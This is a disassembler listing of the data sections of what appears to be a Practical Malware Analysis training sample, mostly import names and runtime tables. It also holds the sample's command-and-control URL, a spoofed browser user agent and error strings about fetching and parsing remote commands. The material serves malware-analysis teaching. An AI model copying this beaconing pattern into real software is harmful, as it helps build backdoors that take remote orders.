.rdata:00406743                 db    1
.rdata:00406744                 db  47h ; G
.rdata:00406745                 db  65h ; e
.rdata:00406746                 db  74h ; t
.rdata:00406747                 db  45h ; E
.rdata:00406748                 db  6Eh ; n
.rdata:00406749                 db  76h ; v
.rdata:0040674A                 db  69h ; i
.rdata:0040674B                 db  72h ; r
.rdata:0040674C                 db  6Fh ; o
.rdata:0040674D                 db  6Eh ; n
.rdata:0040674E                 db  6Dh ; m
.rdata:0040674F                 db  65h ; e
.rdata:00406750                 db  6Eh ; n
.rdata:00406751                 db  74h ; t
.rdata:00406752                 db  53h ; S
.rdata:00406753                 db  74h ; t
.rdata:00406754                 db  72h ; r
.rdata:00406755                 db  69h ; i
.rdata:00406756                 db  6Eh ; n
.rdata:00406757                 db  67h ; g
.rdata:00406758                 db  73h ; s
.rdata:0040675A                 db    8
.rdata:0040675B                 db    1
.rdata:0040675C                 db  47h ; G
.rdata:0040675D                 db  65h ; e
.rdata:0040675E                 db  74h ; t
.rdata:0040675F                 db  45h ; E
.rdata:00406760                 db  6Eh ; n
.rdata:00406761                 db  76h ; v
.rdata:00406762                 db  69h ; i
.rdata:00406763                 db  72h ; r
.rdata:00406764                 db  6Fh ; o
.rdata:00406765                 db  6Eh ; n
.rdata:00406766                 db  6Dh ; m
.rdata:00406767                 db  65h ; e
.rdata:00406768                 db  6Eh ; n
.rdata:00406769                 db  74h ; t
.rdata:0040676A                 db  53h ; S
.rdata:0040676B                 db  74h ; t
.rdata:0040676C                 db  72h ; r
.rdata:0040676D                 db  69h ; i
.rdata:0040676E                 db  6Eh ; n
.rdata:0040676F                 db  67h ; g
.rdata:00406770                 db  73h ; s
.rdata:00406771                 db  57h ; W
.rdata:00406774                 db  6Dh ; m
.rdata:00406775                 db    2
.rdata:00406776                 db  53h ; S
.rdata:00406777                 db  65h ; e
.rdata:00406778                 db  74h ; t
.rdata:00406779                 db  48h ; H
.rdata:0040677A                 db  61h ; a
.rdata:0040677B                 db  6Eh ; n
.rdata:0040677C                 db  64h ; d
.rdata:0040677D                 db  6Ch ; l
.rdata:0040677E                 db  65h ; e
.rdata:0040677F                 db  43h ; C
.rdata:00406780                 db  6Fh ; o
.rdata:00406781                 db  75h ; u
.rdata:00406782                 db  6Eh ; n
.rdata:00406783                 db  74h ; t
.rdata:00406786                 db  52h ; R
.rdata:00406787                 db    1
.rdata:00406788                 db  47h ; G
.rdata:00406789                 db  65h ; e
.rdata:0040678A                 db  74h ; t
.rdata:0040678B                 db  53h ; S
.rdata:0040678C                 db  74h ; t
.rdata:0040678D                 db  64h ; d
.rdata:0040678E                 db  48h ; H
.rdata:0040678F                 db  61h ; a
.rdata:00406790                 db  6Eh ; n
.rdata:00406791                 db  64h ; d
.rdata:00406792                 db  6Ch ; l
.rdata:00406793                 db  65h ; e
.rdata:00406796                 db  15h
.rdata:00406797                 db    1
.rdata:00406798                 db  47h ; G
.rdata:00406799                 db  65h ; e
.rdata:0040679A                 db  74h ; t
.rdata:0040679B                 db  46h ; F
.rdata:0040679C                 db  69h ; i
.rdata:0040679D                 db  6Ch ; l
.rdata:0040679E                 db  65h ; e
.rdata:0040679F                 db  54h ; T
.rdata:004067A0                 db  79h ; y
.rdata:004067A1                 db  70h ; p
.rdata:004067A2                 db  65h ; e
.rdata:004067A4                 db  50h ; P
.rdata:004067A5                 db    1
.rdata:004067A6                 db  47h ; G
.rdata:004067A7                 db  65h ; e
.rdata:004067A8                 db  74h ; t
.rdata:004067A9                 db  53h ; S
.rdata:004067AA                 db  74h ; t
.rdata:004067AB                 db  61h ; a
.rdata:004067AC                 db  72h ; r
.rdata:004067AD                 db  74h ; t
.rdata:004067AE                 db  75h ; u
.rdata:004067AF                 db  70h ; p
.rdata:004067B0                 db  49h ; I
.rdata:004067B1                 db  6Eh ; n
.rdata:004067B2                 db  66h ; f
.rdata:004067B3                 db  6Fh ; o
.rdata:004067B4                 db  41h ; A
.rdata:004067B6                 db  26h ; &
.rdata:004067B7                 db    1
.rdata:004067B8                 db  47h ; G
.rdata:004067B9                 db  65h ; e
.rdata:004067BA                 db  74h ; t
.rdata:004067BB                 db  4Dh ; M
.rdata:004067BC                 db  6Fh ; o
.rdata:004067BD                 db  64h ; d
.rdata:004067BE                 db  75h ; u
.rdata:004067BF                 db  6Ch ; l
.rdata:004067C0                 db  65h ; e
.rdata:004067C1                 db  48h ; H
.rdata:004067C2                 db  61h ; a
.rdata:004067C3                 db  6Eh ; n
.rdata:004067C4                 db  64h ; d
.rdata:004067C5                 db  6Ch ; l
.rdata:004067C6                 db  65h ; e
.rdata:004067C7                 db  41h ; A
.rdata:004067CA                 db    9
.rdata:004067CB                 db    1
.rdata:004067CC                 db  47h ; G
.rdata:004067CD                 db  65h ; e
.rdata:004067CE                 db  74h ; t
.rdata:004067CF                 db  45h ; E
.rdata:004067D0                 db  6Eh ; n
.rdata:004067D1                 db  76h ; v
.rdata:004067D2                 db  69h ; i
.rdata:004067D3                 db  72h ; r
.rdata:004067D4                 db  6Fh ; o
.rdata:004067D5                 db  6Eh ; n
.rdata:004067D6                 db  6Dh ; m
.rdata:004067D7                 db  65h ; e
.rdata:004067D8                 db  6Eh ; n
.rdata:004067D9                 db  74h ; t
.rdata:004067DA                 db  56h ; V
.rdata:004067DB                 db  61h ; a
.rdata:004067DC                 db  72h ; r
.rdata:004067DD                 db  69h ; i
.rdata:004067DE                 db  61h ; a
.rdata:004067DF                 db  62h ; b
.rdata:004067E0                 db  6Ch ; l
.rdata:004067E1                 db  65h ; e
.rdata:004067E2                 db  41h ; A
.rdata:004067E4                 db  75h ; u
.rdata:004067E5                 db    1
.rdata:004067E6                 db  47h ; G
.rdata:004067E7                 db  65h ; e
.rdata:004067E8                 db  74h ; t
.rdata:004067E9                 db  56h ; V
.rdata:004067EA                 db  65h ; e
.rdata:004067EB                 db  72h ; r
.rdata:004067EC                 db  73h ; s
.rdata:004067ED                 db  69h ; i
.rdata:004067EE                 db  6Fh ; o
.rdata:004067EF                 db  6Eh ; n
.rdata:004067F0                 db  45h ; E
.rdata:004067F1                 db  78h ; x
.rdata:004067F2                 db  41h ; A
.rdata:004067F4                 db  9Dh ; ¥
.rdata:004067F5                 db    1
.rdata:004067F6                 db  48h ; H
.rdata:004067F7                 db  65h ; e
.rdata:004067F8                 db  61h ; a
.rdata:004067F9                 db  70h ; p
.rdata:004067FA                 db  44h ; D
.rdata:004067FB                 db  65h ; e
.rdata:004067FC                 db  73h ; s
.rdata:004067FD                 db  74h ; t
.rdata:004067FE                 db  72h ; r
.rdata:004067FF                 db  6Fh ; o
.rdata:00406800                 db  79h ; y
.rdata:00406802                 db  9Bh ; ¢
.rdata:00406803                 db    1
.rdata:00406804                 db  48h ; H
.rdata:00406805                 db  65h ; e
.rdata:00406806                 db  61h ; a
.rdata:00406807                 db  70h ; p
.rdata:00406808                 db  43h ; C
.rdata:00406809                 db  72h ; r
.rdata:0040680A                 db  65h ; e
.rdata:0040680B                 db  61h ; a
.rdata:0040680C                 db  74h ; t
.rdata:0040680D                 db  65h ; e
.rdata:00406810                 db 0BFh ; +
.rdata:00406811                 db    2
.rdata:00406812                 db  56h ; V
.rdata:00406813                 db  69h ; i
.rdata:00406814                 db  72h ; r
.rdata:00406815                 db  74h ; t
.rdata:00406816                 db  75h ; u
.rdata:00406817                 db  61h ; a
.rdata:00406818                 db  6Ch ; l
.rdata:00406819                 db  46h ; F
.rdata:0040681A                 db  72h ; r
.rdata:0040681B                 db  65h ; e
.rdata:0040681C                 db  65h ; e
.rdata:0040681E                 db  9Fh ; ƒ
.rdata:0040681F                 db    1
.rdata:00406820                 db  48h ; H
.rdata:00406821                 db  65h ; e
.rdata:00406822                 db  61h ; a
.rdata:00406823                 db  70h ; p
.rdata:00406824                 db  46h ; F
.rdata:00406825                 db  72h ; r
.rdata:00406826                 db  65h ; e
.rdata:00406827                 db  65h ; e
.rdata:0040682A                 db  2Fh ; /
.rdata:0040682B                 db    2
.rdata:0040682C                 db  52h ; R
.rdata:0040682D                 db  74h ; t
.rdata:0040682E                 db  6Ch ; l
.rdata:0040682F                 db  55h ; U
.rdata:00406830                 db  6Eh ; n
.rdata:00406831                 db  77h ; w
.rdata:00406832                 db  69h ; i
.rdata:00406833                 db  6Eh ; n
.rdata:00406834                 db  64h ; d
.rdata:00406836                 db 0DFh ; ¯
.rdata:00406837                 db    2
.rdata:00406838                 db  57h ; W
.rdata:00406839                 db  72h ; r
.rdata:0040683A                 db  69h ; i
.rdata:0040683B                 db  74h ; t
.rdata:0040683C                 db  65h ; e
.rdata:0040683D                 db  46h ; F
.rdata:0040683E                 db  69h ; i
.rdata:0040683F                 db  6Ch ; l
.rdata:00406840                 db  65h ; e
.rdata:00406842                 db  99h ; Ö
.rdata:00406843                 db    1
.rdata:00406844                 db  48h ; H
.rdata:00406845                 db  65h ; e
.rdata:00406846                 db  61h ; a
.rdata:00406847                 db  70h ; p
.rdata:00406848                 db  41h ; A
.rdata:00406849                 db  6Ch ; l
.rdata:0040684A                 db  6Ch ; l
.rdata:0040684B                 db  6Fh ; o
.rdata:0040684C                 db  63h ; c
.rdata:0040684E                 db 0BFh ; +
.rdata:00406850                 db  47h ; G
.rdata:00406851                 db  65h ; e
.rdata:00406852                 db  74h ; t
.rdata:00406853                 db  43h ; C
.rdata:00406854                 db  50h ; P
.rdata:00406855                 db  49h ; I
.rdata:00406856                 db  6Eh ; n
.rdata:00406857                 db  66h ; f
.rdata:00406858                 db  6Fh ; o
.rdata:0040685A                 db 0B9h ; ¦
.rdata:0040685C                 db  47h ; G
.rdata:0040685D                 db  65h ; e
.rdata:0040685E                 db  74h ; t
.rdata:0040685F                 db  41h ; A
.rdata:00406860                 db  43h ; C
.rdata:00406861                 db  50h ; P
.rdata:00406864                 db  31h ; 1
.rdata:00406865                 db    1
.rdata:00406866                 db  47h ; G
.rdata:00406867                 db  65h ; e
.rdata:00406868                 db  74h ; t
.rdata:00406869                 db  4Fh ; O
.rdata:0040686A                 db  45h ; E
.rdata:0040686B                 db  4Dh ; M
.rdata:0040686C                 db  43h ; C
.rdata:0040686D                 db  50h ; P
.rdata:00406870                 db 0BBh ; +
.rdata:00406871                 db    2
.rdata:00406872                 db  56h ; V
.rdata:00406873                 db  69h ; i
.rdata:00406874                 db  72h ; r
.rdata:00406875                 db  74h ; t
.rdata:00406876                 db  75h ; u
.rdata:00406877                 db  61h ; a
.rdata:00406878                 db  6Ch ; l
.rdata:00406879                 db  41h ; A
.rdata:0040687A                 db  6Ch ; l
.rdata:0040687B                 db  6Ch ; l
.rdata:0040687C                 db  6Fh ; o
.rdata:0040687D                 db  63h ; c
.rdata:00406880                 db 0A2h ; ó
.rdata:00406881                 db    1
.rdata:00406882                 db  48h ; H
.rdata:00406883                 db  65h ; e
.rdata:00406884                 db  61h ; a
.rdata:00406885                 db  70h ; p
.rdata:00406886                 db  52h ; R
.rdata:00406887                 db  65h ; e
.rdata:00406888                 db  41h ; A
.rdata:00406889                 db  6Ch ; l
.rdata:0040688A                 db  6Ch ; l
.rdata:0040688B                 db  6Fh ; o
.rdata:0040688C                 db  63h ; c
.rdata:0040688E                 db  3Eh ; >
.rdata:0040688F                 db    1
.rdata:00406890                 db  47h ; G
.rdata:00406891                 db  65h ; e
.rdata:00406892                 db  74h ; t
.rdata:00406893                 db  50h ; P
.rdata:00406894                 db  72h ; r
.rdata:00406895                 db  6Fh ; o
.rdata:00406896                 db  63h ; c
.rdata:00406897                 db  41h ; A
.rdata:00406898                 db  64h ; d
.rdata:00406899                 db  64h ; d
.rdata:0040689A                 db  72h ; r
.rdata:0040689B                 db  65h ; e
.rdata:0040689C                 db  73h ; s
.rdata:0040689D                 db  73h ; s
.rdata:004068A0                 db 0C2h ; -
.rdata:004068A1                 db    1
.rdata:004068A2                 db  4Ch ; L
.rdata:004068A3                 db  6Fh ; o
.rdata:004068A4                 db  61h ; a
.rdata:004068A5                 db  64h ; d
.rdata:004068A6                 db  4Ch ; L
.rdata:004068A7                 db  69h ; i
.rdata:004068A8                 db  62h ; b
.rdata:004068A9                 db  72h ; r
.rdata:004068AA                 db  61h ; a
.rdata:004068AB                 db  72h ; r
.rdata:004068AC                 db  79h ; y
.rdata:004068AD                 db  41h ; A
.rdata:004068B0                 db  1Ah
.rdata:004068B1                 db    1
.rdata:004068B2                 db  47h ; G
.rdata:004068B3                 db  65h ; e
.rdata:004068B4                 db  74h ; t
.rdata:004068B5                 db  4Ch ; L
.rdata:004068B6                 db  61h ; a
.rdata:004068B7                 db  73h ; s
.rdata:004068B8                 db  74h ; t
.rdata:004068B9                 db  45h ; E
.rdata:004068BA                 db  72h ; r
.rdata:004068BB                 db  72h ; r
.rdata:004068BC                 db  6Fh ; o
.rdata:004068BD                 db  72h ; r
.rdata:004068C0                 db 0AAh ; ¬
.rdata:004068C2                 db  46h ; F
.rdata:004068C3                 db  6Ch ; l
.rdata:004068C4                 db  75h ; u
.rdata:004068C5                 db  73h ; s
.rdata:004068C6                 db  68h ; h
.rdata:004068C7                 db  46h ; F
.rdata:004068C8                 db  69h ; i
.rdata:004068C9                 db  6Ch ; l
.rdata:004068CA                 db  65h ; e
.rdata:004068CB                 db  42h ; B
.rdata:004068CC                 db  75h ; u
.rdata:004068CD                 db  66h ; f
.rdata:004068CE                 db  66h ; f
.rdata:004068CF                 db  65h ; e
.rdata:004068D0                 db  72h ; r
.rdata:004068D1                 db  73h ; s
.rdata:004068D4                 db  6Ah ; j
.rdata:004068D5                 db    2
.rdata:004068D6                 db  53h ; S
.rdata:004068D7                 db  65h ; e
.rdata:004068D8                 db  74h ; t
.rdata:004068D9                 db  46h ; F
.rdata:004068DA                 db  69h ; i
.rdata:004068DB                 db  6Ch ; l
.rdata:004068DC                 db  65h ; e
.rdata:004068DD                 db  50h ; P
.rdata:004068DE                 db  6Fh ; o
.rdata:004068DF                 db  69h ; i
.rdata:004068E0                 db  6Eh ; n
.rdata:004068E1                 db  74h ; t
.rdata:004068E2                 db  65h ; e
.rdata:004068E3                 db  72h ; r
.rdata:004068E6                 db 0E4h ; S
.rdata:004068E7                 db    1
.rdata:004068E8                 db  4Dh ; M
.rdata:004068E9                 db  75h ; u
.rdata:004068EA                 db  6Ch ; l
.rdata:004068EB                 db  74h ; t
.rdata:004068EC                 db  69h ; i
.rdata:004068ED                 db  42h ; B
.rdata:004068EE                 db  79h ; y
.rdata:004068EF                 db  74h ; t
.rdata:004068F0                 db  65h ; e
.rdata:004068F1                 db  54h ; T
.rdata:004068F2                 db  6Fh ; o
.rdata:004068F3                 db  57h ; W
.rdata:004068F4                 db  69h ; i
.rdata:004068F5                 db  64h ; d
.rdata:004068F6                 db  65h ; e
.rdata:004068F7                 db  43h ; C
.rdata:004068F8                 db  68h ; h
.rdata:004068F9                 db  61h ; a
.rdata:004068FA                 db  72h ; r
.rdata:004068FC                 db 0BFh ; +
.rdata:004068FD                 db    1
.rdata:004068FE                 db  4Ch ; L
.rdata:004068FF                 db  43h ; C
.rdata:00406900                 db  4Dh ; M
.rdata:00406901                 db  61h ; a
.rdata:00406902                 db  70h ; p
.rdata:00406903                 db  53h ; S
.rdata:00406904                 db  74h ; t
.rdata:00406905                 db  72h ; r
.rdata:00406906                 db  69h ; i
.rdata:00406907                 db  6Eh ; n
.rdata:00406908                 db  67h ; g
.rdata:00406909                 db  41h ; A
.rdata:0040690C                 db 0C0h ; +
.rdata:0040690D                 db    1
.rdata:0040690E                 db  4Ch ; L
.rdata:0040690F                 db  43h ; C
.rdata:00406910                 db  4Dh ; M
.rdata:00406911                 db  61h ; a
.rdata:00406912                 db  70h ; p
.rdata:00406913                 db  53h ; S
.rdata:00406914                 db  74h ; t
.rdata:00406915                 db  72h ; r
.rdata:00406916                 db  69h ; i
.rdata:00406917                 db  6Eh ; n
.rdata:00406918                 db  67h ; g
.rdata:00406919                 db  57h ; W
.rdata:0040691C                 db  53h ; S
.rdata:0040691D                 db    1
.rdata:0040691E                 db  47h ; G
.rdata:0040691F                 db  65h ; e
.rdata:00406920                 db  74h ; t
.rdata:00406921                 db  53h ; S
.rdata:00406922                 db  74h ; t
.rdata:00406923                 db  72h ; r
.rdata:00406924                 db  69h ; i
.rdata:00406925                 db  6Eh ; n
.rdata:00406926                 db  67h ; g
.rdata:00406927                 db  54h ; T
.rdata:00406928                 db  79h ; y
.rdata:00406929                 db  70h ; p
.rdata:0040692A                 db  65h ; e
.rdata:0040692B                 db  41h ; A
.rdata:0040692E                 db  56h ; V
.rdata:0040692F                 db    1
.rdata:00406930                 db  47h ; G
.rdata:00406931                 db  65h ; e
.rdata:00406932                 db  74h ; t
.rdata:00406933                 db  53h ; S
.rdata:00406934                 db  74h ; t
.rdata:00406935                 db  72h ; r
.rdata:00406936                 db  69h ; i
.rdata:00406937                 db  6Eh ; n
.rdata:00406938                 db  67h ; g
.rdata:00406939                 db  54h ; T
.rdata:0040693A                 db  79h ; y
.rdata:0040693B                 db  70h ; p
.rdata:0040693C                 db  65h ; e
.rdata:0040693D                 db  57h ; W
.rdata:00406940                 db  7Ch ; |
.rdata:00406941                 db    2
.rdata:00406942                 db  53h ; S
.rdata:00406943                 db  65h ; e
.rdata:00406944                 db  74h ; t
.rdata:00406945                 db  53h ; S
.rdata:00406946                 db  74h ; t
.rdata:00406947                 db  64h ; d
.rdata:00406948                 db  48h ; H
.rdata:00406949                 db  61h ; a
.rdata:0040694A                 db  6Eh ; n
.rdata:0040694B                 db  64h ; d
.rdata:0040694C                 db  6Ch ; l
.rdata:0040694D                 db  65h ; e
.rdata:00406950                 db  1Bh
.rdata:00406952                 db  43h ; C
.rdata:00406953                 db  6Ch ; l
.rdata:00406954                 db  6Fh ; o
.rdata:00406955                 db  73h ; s
.rdata:00406956                 db  65h ; e
.rdata:00406957                 db  48h ; H
.rdata:00406958                 db  61h ; a
.rdata:00406959                 db  6Eh ; n
.rdata:0040695A                 db  64h ; d
.rdata:0040695B                 db  6Ch ; l
.rdata:0040695C                 db  65h ; e
.rdata:00406FFF _rdata          ends
.rdata:00406FFF
.data:00407000 ; Section 3. (virtual address 00007000)
.data:00407000 ; Virtual size                  : 00003F08 (  16136.)
.data:00407000 ; Section size in file          : 00003000 (  12288.)
.data:00407000 ; Offset to raw data for section: 00007000
.data:00407000 ; Flags C0000040: Data Readable Writable
.data:00407000 ; Alignment     : default
.data:00407000 ; ---------------------------------------------------------------------------
.data:00407000
.data:00407000 ; Segment type: Pure data
.data:00407000 ; Segment permissions: Read/Write
.data:00407000 _data           segment para public 'DATA' use32
.data:00407000                 assume cs:_data
.data:00407000                 ;org 407000h
.data:0040700C                 db    9
.data:0040700D                 db  1Ch
.data:0040700E                 db  40h ; @
.data:00407010                 db  64h ; d
.data:00407011                 db  35h ; 5
.data:00407012                 db  40h ; @
.data:0040701C                 db 0AEh ; «
.data:0040701D                 db  1Ch
.data:0040701E                 db  40h ; @
.data:00407030 aError1_1NoInte db 'Error 1.1: No Internet',0Ah,0
.data:00407030                                         ; DATA XREF: sub_401000:loc_40102Bo
.data:00407048 aSuccessInterne db 'Success: Internet Connection',0Ah,0
.data:00407048                                         ; DATA XREF: sub_401000+17o
.data:00407066                 align 4
.data:00407068 aError2_3FailTo db 'Error 2.3: Fail to get command',0Ah,0
.data:00407068                                         ; DATA XREF: sub_401040:loc_40111Do
.data:00407088 aError2_2FailTo db 'Error 2.2: Fail to ReadFile',0Ah,0
.data:00407088                                         ; DATA XREF: sub_401040+80o
.data:004070A5                 align 4
.data:004070A8 aError2_1FailTo db 'Error 2.1: Fail to OpenUrl',0Ah,0
.data:004070A8                                         ; DATA XREF: sub_401040+3Fo
.data:004070C4 ; char szUrl[]
.data:004070C4 szUrl           db 'http://www.practicalmalwareanalysis.com/cc.htm',0
.data:004070C4                                         ; DATA XREF: sub_401040+27o
.data:004070F3                 align 4
.data:004070F4 ; char szAgent[]
.data:004070F4 szAgent         db 'Internet Explorer 7.5/pma',0 ; DATA XREF: sub_401040+11o
.data:0040710E                 align 10h
.data:00407110 aSuccessParsedC db 'Success: Parsed command is %c',0Ah,0
.data:00407110                                         ; DATA XREF: _main+31o
.data:0040712F                 align 10h
.data:00407130 off_407130      dd offset __exit        ; DATA XREF: __amsg_exit+1Cr
.data:00407134 dword_407134    dd 1                    ; DATA XREF: __FF_MSGBANNER+Er
.data:00407134                                         ; sub_402909+46r ...
.data:00407138 off_407138      dd offset aNull         ; DATA XREF: sub_4013A2:loc_40171Br
.data:00407138                                         ; sub_4013A2+488r
.data:00407138                                         ; "(null)"
.data:0040713C off_40713C      dd offset aNull_0       ; DATA XREF: sub_4013A2+26Er
.data:0040713C                                         ; "(null)"
.data:00407140 off_407140      dd offset unk_409F00    ; DATA XREF: .text:00401C5Eo
.data:00407149                 db  9Fh ; ƒ
.data:0040714A                 db  40h ; @
.data:0040714C                 db    1
.data:0040714D                 db    1
.data:00407159                 db  10h
.data:00407160                                         ; __stbuf+12o ...
.data:0040716C                 db    2
.data:00407170                 db    1
.data:00407180                                         ; __flsbuf+58o
.data:0040718C                 db    2
.data:00407190                 db    2
.data:004073C0 dword_4073C0    dd 0C0000005h           ; DATA XREF: .text:00401C72o
.data:004073C0                                         ; _xcptlookup+Ar ...
.data:004073C4                 db  0Bh
.data:004073CC                 db  1Dh
.data:004073CF                 db 0C0h ; +
.data:004073D0                 db    4
.data:004073D8                 db  96h ; û
.data:004073DB                 db 0C0h ; +
.data:004073DC                 db    4
.data:004073E4                 db  8Dh ; ì
.data:004073E7                 db 0C0h ; +
.data:004073E8                 db    8
.data:004073F0                 db  8Eh ; Ä
.data:004073F3                 db 0C0h ; +
.data:004073F4                 db    8
.data:004073FC                 db  8Fh ; Å
.data:004073FF                 db 0C0h ; +
.data:00407400                 db    8
.data:00407408                 db  90h ; É
.data:0040740B                 db 0C0h ; +
.data:0040740C                 db    8
.data:00407414                 db  91h ; æ
.data:00407417                 db 0C0h ; +
.data:00407418                 db    8
.data:00407420                 db  92h ; Æ
.data:00407423                 db 0C0h ; +
.data:00407424                 db    8
.data:0040742C                 db  93h ; ô
.data:0040742F                 db 0C0h ; +
.data:00407430                 db    8
.data:00407438 dword_407438    dd 3                    ; DATA XREF: __XcptFilter+58r
.data:0040743C dword_40743C    dd 7                    ; DATA XREF: __XcptFilter+5Er
.data:00407440 dword_407440    dd 0Ah                  ; DATA XREF: _xcptlookup+4r
.data:00407444 dword_407444    dd 8Ch                  ; DATA XREF: __XcptFilter+82r
.data:00407444                                         ; __XcptFilter+8Fw ...
.data:00407448 unk_407448      db 0FFh                 ; DATA XREF: __flsbuf:loc_402F42o
.data:00407449                 db 0FFh
.data:0040744A                 db 0FFh
.data:0040744B                 db 0FFh
.data:0040744D                 db  0Ah
.data:00407450                 db  10h
.data:00407454 unk_407454      db  20h                 ; DATA XREF: .text:004027CFo
.data:00407454                                         ; __NLG_Notify+2o
.data:00407455                 db    5
.data:00407456                 db  93h ; ô
.data:00407457                 db  19h
.data:00407468 dword_407468    dd 2                    ; DATA XREF: sub_402909+Eo
.data:00407468                                         ; sub_402909+28r
.data:0040746C off_40746C      dd offset aR6002FloatingP ; DATA XREF: sub_402909+FCr
.data:0040746C                                         ; sub_402909+12Dr
.data:0040746C                                         ; "R6002\r\n- floating point not loaded\r\n"
.data:00407470                 db    8
.data:00407474                 db 0B8h ; +
.data:00407475                 db  63h ; c
.data:00407476                 db  40h ; @
.data:00407478                 db    9
.data:0040747C                 db  8Ch ; î
.data:0040747D                 db  63h ; c
.data:0040747E                 db  40h ; @
.data:00407480                 db  0Ah
.data:00407484                 db  68h ; h
.data:00407485                 db  63h ; c
.data:00407486                 db  40h ; @
.data:00407488                 db  10h
.data:0040748C                 db  3Ch ; <
.data:0040748D                 db  63h ; c
.data:0040748E                 db  40h ; @
.data:00407490                 db  11h
.data:00407494                 db  0Ch
.data:00407495                 db  63h ; c
.data:00407496                 db  40h ; @
.data:00407498                 db  12h
.data:0040749C                 db 0E8h ; F
.data:0040749D                 db  62h ; b
.data:0040749E                 db  40h ; @
.data:004074A0                 db  13h
.data:004074A4                 db 0BCh ; +
.data:004074A5                 db  62h ; b
.data:004074A6                 db  40h ; @
.data:004074A8                 db  18h
.data:004074AC                 db  84h ; ä
.data:004074AD                 db  62h ; b
.data:004074AE                 db  40h ; @
.data:004074B0                 db  19h
.data:004074B4                 db  5Ch ; \
.data:004074B5                 db  62h ; b
.data:004074B6                 db  40h ; @
.data:004074B8                 db  1Ah
.data:004074BC                 db  24h ; $
.data:004074BD                 db  62h ; b
.data:004074BE                 db  40h ; @
.data:004074C0                 db  1Bh
.data:004074C4                 db 0ECh ; 8
.data:004074C5                 db  61h ; a
.data:004074C6                 db  40h ; @
.data:004074C8                 db  1Ch
.data:004074CC                 db 0C4h ; -
.data:004074CD                 db  61h ; a
.data:004074CE                 db  40h ; @
.data:004074D0                 db  78h ; x
.data:004074D4                 db 0B4h ; ¦
.data:004074D5                 db  61h ; a
.data:004074D6                 db  40h ; @
.data:004074D8                 db  79h ; y
.data:004074DC                 db 0A4h ; ñ
.data:004074DD                 db  61h ; a
.data:004074DE                 db  40h ; @
.data:004074E0                 db  7Ah ; z
.data:004074E4                 db  94h ; ö
.data:004074E5                 db  61h ; a
.data:004074E6                 db  40h ; @
.data:004074E8                 db 0FCh ; n
.data:004074EC                 db  90h ; É
.data:004074ED                 db  61h ; a
.data:004074EE                 db  40h ; @
.data:004074F0                 db 0FFh
.data:004074F4                 db  80h ; Ç
.data:004074F5                 db  61h ; a
.data:004074F6                 db  40h ; @
.data:00407500 off_407500      dd offset __fptrap      ; DATA XREF: sub_4013A2+3F0r
.data:00407504 off_407504      dd offset __fptrap      ; DATA XREF: sub_4013A2+41Cr
.data:00407508                 dd offset __fptrap
.data:0040750C off_40750C      dd offset __fptrap      ; DATA XREF: sub_4013A2+40Br
.data:00407510                 dd offset __fptrap
.data:00407514                 dd offset __fptrap
.data:00407518 off_407518      dd offset unk_407522    ; DATA XREF: sub_4013A2:loc_401555r
.data:00407518                                         ; _strtoxl:loc_4038FCr ...
.data:0040751C                 dd offset unk_407522
.data:00407522 unk_407522      db  20h                 ; DATA XREF: .data:off_407518o
.data:00407522                                         ; .data:0040751Co
.data:00407524                 db  20h
.data:00407526                 db  20h
.data:00407528                 db  20h
.data:0040752A                 db  20h
.data:0040752C                 db  20h
.data:0040752E                 db  20h
.data:00407530                 db  20h
.data:00407532                 db  20h
.data:00407534                 db  28h ; (
.data:00407536                 db  28h ; (
.data:00407538                 db  28h ; (
.data:0040753A                 db  28h ; (
.data:0040753C                 db  28h ; (
.data:0040753E                 db  20h
.data:00407540                 db  20h
.data:00407542                 db  20h
.data:00407544                 db  20h
.data:00407546                 db  20h
.data:00407548                 db  20h
.data:0040754A                 db  20h
.data:0040754C                 db  20h
.data:0040754E                 db  20h
.data:00407550                 db  20h
.data:00407552                 db  20h
.data:00407554                 db  20h
.data:00407556                 db  20h
.data:00407558                 db  20h
.data:0040755A                 db  20h
.data:0040755C                 db  20h
.data:0040755E                 db  20h
.data:00407560                 db  20h
.data:00407562                 db  48h ; H
.data:00407564                 db  10h
.data:00407566                 db  10h
.data:00407568                 db  10h
.data:0040756A                 db  10h
.data:0040756C                 db  10h
.data:0040756E                 db  10h
.data:00407570                 db  10h
.data:00407572                 db  10h
.data:00407574                 db  10h
.data:00407576                 db  10h
.data:00407578                 db  10h
.data:0040757A                 db  10h
.data:0040757C                 db  10h
.data:0040757E                 db  10h
.data:00407580                 db  10h
.data:00407582                 db  84h ; ä
.data:00407584                 db  84h ; ä
.data:00407586                 db  84h ; ä
.data:00407588                 db  84h ; ä
.data:0040758A                 db  84h ; ä
.data:0040758C                 db  84h ; ä
.data:0040758E                 db  84h ; ä
.data:00407590                 db  84h ; ä
.data:00407592                 db  84h ; ä
.data:00407594                 db  84h ; ä
.data:00407596                 db  10h
.data:00407598                 db  10h
.data:0040759A                 db  10h
.data:0040759C                 db  10h
.data:0040759E                 db  10h
.data:004075A0                 db  10h
.data:004075A2                 db  10h
.data:004075A4                 db  81h ; ü
.data:004075A6                 db  81h ; ü
.data:004075A8                 db  81h ; ü
.data:004075AA                 db  81h ; ü
.data:004075AC                 db  81h ; ü
.data:004075AE                 db  81h ; ü
.data:004075B0                 db    1
.data:004075B2                 db    1
.data:004075B4                 db    1
.data:004075B6                 db    1
.data:004075B8                 db    1
.data:004075BA                 db    1
.data:004075BC                 db    1
.data:004075BE                 db    1
.data:004075C0                 db    1
.data:004075C2                 db    1
.data:004075C4                 db    1
.data:004075C6                 db    1
.data:004075C8                 db    1
.data:004075CA                 db    1
.data:004075CC                 db    1
.data:004075CE                 db    1
.data:004075D0                 db    1
.data:004075D2                 db    1
.data:004075D4                 db    1
.data:004075D6                 db    1
.data:004075D8                 db  10h
.data:004075DA                 db  10h
.data:004075DC                 db  10h
.data:004075DE                 db  10h
.data:004075E0                 db  10h
.data:004075E2                 db  10h
.data:004075E4                 db  82h ; é
.data:004075E6                 db  82h ; é
.data:004075E8                 db  82h ; é
.data:004075EA                 db  82h ; é
.data:004075EC                 db  82h ; é
.data:004075EE                 db  82h ; é
.data:004075F0                 db    2
.data:004075F2                 db    2
.data:004075F4                 db    2
.data:004075F6                 db    2
.data:004075F8                 db    2
.data:004075FA                 db    2
.data:004075FC                 db    2
.data:004075FE                 db    2
.data:00407600                 db    2
.data:00407602                 db    2
.data:00407604                 db    2
.data:00407606                 db    2
.data:00407608                 db    2
.data:0040760A                 db    2
.data:0040760C                 db    2
.data:0040760E                 db    2
.data:00407610                 db    2
.data:00407612                 db    2
.data:00407614                 db    2
.data:00407616                 db    2
.data:00407618                 db  10h
.data:0040761A                 db  10h
.data:0040761C                 db  10h
.data:0040761E                 db  10h
.data:00407620                 db  20h
